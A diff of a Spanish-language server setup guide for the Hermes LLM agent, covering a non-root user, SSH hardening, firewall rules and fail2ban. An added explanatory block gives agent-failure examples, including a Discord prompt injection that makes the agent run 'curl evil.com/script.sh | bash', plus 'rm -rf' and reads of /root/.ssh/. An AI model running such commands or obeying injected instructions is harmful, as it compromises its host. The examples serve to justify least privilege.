@@ -212,7 +212,17 @@ hermes update       # vuelve a tirar del install.sh y actualiza todo
 
 ### 4.2. Crea un usuario no-root para Hermes
 
-Hermes debe vivir en su propio usuario (no root) para limitar daño en caso de RCE accidental.
+Hermes debe vivir en su propio usuario (no root) para limitar daño en caso de **RCE accidental**.
+
+> **¿Qué es un RCE accidental?**
+>
+> RCE = *Remote Code Execution* (ejecución remota de código). En este contexto NO es un atacante explotando una vulnerabilidad: es **el propio agente** ejecutando un comando que no debía. Ejemplos reales que pasan en agentes LLM:
+>
+> - El modelo malinterpreta una instrucción y hace `rm -rf ~/proyectos` pensando que limpia un build.
+> - Un usuario en Discord lanza un *prompt injection* dentro de una URL y Hermes acaba ejecutando `curl evil.com/script.sh | bash`.
+> - Una skill mal escrita (o auto-generada por el propio agente) entra en un bucle que escribe en `/etc/`.
+>
+> Si Hermes vive como `root`, cualquiera de esos errores compromete todo el servidor: borra el sistema, modifica `/etc/sudoers`, lee `/root/.ssh/`, etc. Como usuario `hermes` sin acceso a archivos del sistema, el "explosion radius" se queda en `/home/hermes/`. Es la primera línea de defensa: **menos privilegios = menos daño cuando algo va mal**.
 
 ```bash
 adduser --disabled-password --gecos "" hermes
@@ -233,7 +243,20 @@ chmod 440 /etc/sudoers.d/hermes
 
 ### 4.3. Endurece SSH
 
-Edita `/etc/ssh/sshd_config.d/99-hardening.conf`:
+#### ¿Para qué sirve "endurecer SSH"?
+
+Tu VPS está en Internet pública, con una IPv4 fija. Desde el segundo en que se enciende, **bots automatizados** empiezan a probar logins por SSH (puerto 22) intentando contraseñas comunes (`root/123456`, `admin/admin`, …) o claves filtradas. No es paranoia: si miras `/var/log/auth.log` a las pocas horas de crear el servidor, verás cientos de intentos.
+
+"Endurecer SSH" significa cambiar la configuración por defecto del demonio (`sshd`) para que esos intentos automatizados ni siquiera tengan opción. Con la config que vamos a aplicar, un bot que intente `ssh root@tu-ip` recibe rechazo inmediato sin llegar a probar password.
+
+#### ¿Es necesario? ¿Te limita?
+
+- **¿Es necesario?** Sí, **especialmente** porque vamos a tener un agente con acceso a Docker y al filesystem corriendo 24/7. Una sola contraseña débil filtrada y pierdes todo.
+- **¿Te limita?** Mínimamente, y solo si pierdes tu clave SSH. La tabla de abajo desglosa cada línea con su trade-off real.
+
+#### Paso 1 — Escribe la configuración (todavía sin aplicar)
+
+Esto solo crea el archivo. Hasta que no reinicies `ssh` (paso 3) la config nueva no entra en vigor, así que no hay riesgo de quedarte fuera todavía.
 
 ```bash
 cat > /etc/ssh/sshd_config.d/99-hardening.conf <<'EOF'
@@ -246,38 +269,107 @@ MaxAuthTries 3
 LoginGraceTime 20
 AllowUsers hermes
 EOF
-
-systemctl restart ssh
 ```
 
-> **No cierres la sesión todavía.** En otra terminal verifica que puedes entrar como `hermes`:
+Valida la sintaxis antes de aplicar:
+
+```bash
+sshd -t && echo "OK config" || echo "ERROR: revisa el archivo"
+```
+
+Si sale `ERROR`, corrige el archivo antes de seguir. `sshd -t` no toca nada, solo valida.
+
+#### Qué hace cada línea (y qué limitación introduce)
+
+| Directiva | Qué hace | ¿Te limita? |
+| --------- | -------- | ----------- |
+| `PermitRootLogin no` | Bloquea el login directo como `root` por SSH. Para tareas privilegiadas, entras como `hermes` y usas `sudo`. | No: en el paso 4.2 ya diste sudo NOPASSWD a `hermes`. Cualquier cosa que harías como root, la haces con `sudo` |
+| `PasswordAuthentication no` | Desactiva el login con contraseña. Solo se acepta clave SSH. | **Sí, parcialmente**: si pierdes la clave privada `~/.ssh/hetzner_hermes`, **no puedes entrar por SSH**. Mitigación: la consola web de Hetzner (Rescue mode) sigue funcionando con la contraseña root del email; desde ahí puedes resetear claves. **Nunca te quedas fuera del todo** |
+| `PubkeyAuthentication yes` | Activa explícitamente login por clave pública (es el default, pero lo dejamos explícito). | No |
+| `KbdInteractiveAuthentication no` | Desactiva el método de auth interactivo (PAM, OTP por teclado…). | No, salvo que quisieras montar 2FA con `google-authenticator`. Si en el futuro lo quieres, esto se pone a `yes` |
+| `ChallengeResponseAuthentication no` | Alias antiguo del anterior, lo dejamos explícito por compatibilidad. | No |
+| `MaxAuthTries 3` | Cierra la conexión tras 3 intentos fallidos (en lugar del default 6). Combinado con `fail2ban`, banea la IP. | Solo si te equivocas tecleando 3 veces — vuelves a conectar y reinicia el contador |
+| `LoginGraceTime 20` | Si no completas el login en 20 segundos, cierra. (Default: 120s.) Reduce ventana para ataques de fuerza bruta lentos. | No: 20 s es de sobra para una conexión legítima con clave |
+| `AllowUsers hermes` | **Whitelist explícita**: solo el usuario `hermes` puede abrir sesión SSH. Aunque crees otro usuario en el sistema, no podrá entrar por SSH a menos que lo añadas aquí. | Solo si más adelante creas más usuarios para SSH (p.ej. un compañero). Editas esta línea: `AllowUsers hermes alice bob` y `systemctl restart ssh` |
+
+#### Lo que **NO** estamos cambiando
+
+- **Puerto:** seguimos en el 22. Cambiarlo a 2222 reduce ruido en logs (los bots escanean primero el 22) pero **no añade seguridad real**: un atacante serio escanea todos los puertos. Lo dejamos en 22 para que cualquier cliente SSH funcione sin `-p`.
+- **2FA:** opcional para más adelante. Con clave SSH + fail2ban + `MaxAuthTries 3` ya estás muy por encima del 99 % de servidores en Internet.
+
+#### Paso 2 — Prepara una sesión de seguridad (ANTES de aplicar)
+
+> ⚠️ **No cierres la sesión root actual.** Va a ser tu red de seguridad por si la nueva config tiene algún problema. Hasta que verifiques que el login con `hermes` funciona, **mantén abierta la terminal donde estás como root**.
+
+#### Paso 3 — Aplica la nueva config
+
+Ahora sí, recarga `sshd` (`reload` aplica la nueva config sin matar las conexiones SSH ya abiertas, así que tu sesión root sigue viva):
+
+```bash
+systemctl reload ssh
+```
+
+> Si tu sistema solo tiene `restart` y no `reload`, usa `systemctl restart ssh`. Las conexiones SSH activas suelen sobrevivir a un restart porque el demonio solo se reinicia para nuevas conexiones, pero `reload` es la opción segura por defecto.
+
+#### Paso 4 — Verifica desde otra terminal
+
+En tu **máquina local**, abre una terminal nueva (sin cerrar la del VPS) y prueba:
+
+```bash
+ssh -i ~/.ssh/hetzner_hermes hermes@SERVER_IP
+```
+
+- ✅ **Si entra como `hermes`** → la config nueva funciona. Ahora sí puedes cerrar la sesión root original.
+- ❌ **Si falla** → vuelve a la sesión root (que sigue abierta) y arregla el archivo `/etc/ssh/sshd_config.d/99-hardening.conf` o las claves en `/home/hermes/.ssh/authorized_keys`. Tras corregir, repite `sshd -t` y `systemctl reload ssh`.
+
+#### Si te quedas fuera (plan B)
+
+Cuando pasa lo peor (perdiste la clave, te equivocaste en `AllowUsers`, etc.):
+
+1. Ve a la consola Hetzner → tu servidor → **Rescue → Activate Rescue System** (Linux 64).
+2. Reinicia el VPS desde el panel.
+3. Conecta vía la **consola web** (botón "Console") con la password root que Hetzner te muestra.
+4. Monta el disco (`mount /dev/sda1 /mnt`) y arregla `/mnt/etc/ssh/sshd_config.d/99-hardening.conf` o `/mnt/home/hermes/.ssh/authorized_keys`.
+5. Desactiva el rescue mode y reinicia normal.
+
+Vamos: **endurecer no te encierra**, te obliga a tener tu clave SSH organizada.
+
+---
+
+> ### 🔁 Cambio de usuario: a partir de aquí trabajas como `hermes`
+>
+> Si verificaste el paso 4.3.4 con éxito, **cierra la sesión root** y conéctate como `hermes`:
+>
 > ```bash
+> # en tu máquina local
 > ssh -i ~/.ssh/hetzner_hermes hermes@SERVER_IP
 > ```
-> Si funciona, ya puedes cerrar la sesión root.
+>
+> Todos los comandos de aquí en adelante (4.4, 4.5, 5, 6…) los ejecutas como `hermes` con `sudo` cuando hagan falta privilegios. Ya configuramos `sudo NOPASSWD` en el paso 4.2, así que `sudo` no te pedirá contraseña.
 
 ### 4.4. Firewall (UFW + Hetzner Cloud Firewall)
 
 **Doble capa**: UFW dentro del VPS + Cloud Firewall en el panel.
 
-UFW dentro:
+UFW dentro (necesita `sudo` porque toca reglas del kernel):
+
 ```bash
-ufw default deny incoming
-ufw default allow outgoing
-ufw allow 22/tcp
-ufw allow 80/tcp
-ufw allow 443/tcp
-ufw --force enable
-ufw status verbose
+sudo ufw default deny incoming
+sudo ufw default allow outgoing
+sudo ufw allow 22/tcp
+sudo ufw allow 80/tcp
+sudo ufw allow 443/tcp
+sudo ufw --force enable
+sudo ufw status verbose
 ```
 
 Cloud Firewall (Hetzner panel → **Firewalls → Create Firewall**):
 
-| Direction | Protocol | Port  | Source        |
-|-----------|----------|-------|---------------|
-| Inbound   | TCP      | 22    | (tu IP/32 si es fija; en otro caso `0.0.0.0/0`) |
-| Inbound   | TCP      | 80    | 0.0.0.0/0     |
-| Inbound   | TCP      | 443   | 0.0.0.0/0     |
+| Direction | Protocol | Port | Source                                          |
+| --------- | -------- | ---- | ----------------------------------------------- |
+| Inbound   | TCP      | 22   | (tu IP/32 si es fija; en otro caso `0.0.0.0/0`) |
+| Inbound   | TCP      | 80   | 0.0.0.0/0                                       |
+| Inbound   | TCP      | 443  | 0.0.0.0/0                                       |
 
 Aplica la firewall al servidor `hermes-lab`.
 
@@ -290,15 +382,15 @@ Aplica la firewall al servidor `hermes-lab`.
 Activa la jail por defecto para SSH:
 
 ```bash
-systemctl enable --now fail2ban
-fail2ban-client status sshd
+sudo systemctl enable --now fail2ban
+sudo fail2ban-client status sshd
 ```
 
 ---
 
 ## 5. Instalar Docker y Docker Compose
 
-A partir de aquí trabaja como `hermes` (`ssh hermes@SERVER_IP`). Instala Docker oficial:
+Sigues como `hermes`. Instala Docker oficial:
 
 ```bash
 sudo install -m 0755 -d /etc/apt/keyrings
